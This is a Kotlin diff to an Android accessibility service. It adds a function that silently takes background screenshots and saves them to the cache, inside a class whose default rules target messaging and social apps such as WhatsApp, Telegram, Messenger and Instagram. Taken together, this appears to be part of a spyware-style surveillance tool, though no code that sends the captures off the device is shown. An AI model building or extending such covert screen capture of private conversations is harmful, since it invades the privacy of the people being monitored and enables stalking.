@@ -356,6 +356,37 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
+    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
+        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
+            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
+            callback(null)
+            return
+        }
+
+        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
+            override fun onSuccess(screenshot: ScreenshotResult) {
+                try {
+                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
+                    if (bitmap == null) { callback(null); return }
+                    
+                    val file = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
+                    java.io.FileOutputStream(file).use { out ->
+                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
+                    }
+                    screenshot.hardwareBuffer.close()
+                    callback(file)
+                } catch (e: Exception) {
+                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
+                    callback(null)
+                }
+            }
+            override fun onFailure(errorCode: Int) {
+                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
+                callback(null)
+            }
+        })
+    }
+
     private fun getDefaultRules(): JSONObject {
         val defaults = JSONObject()
         val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
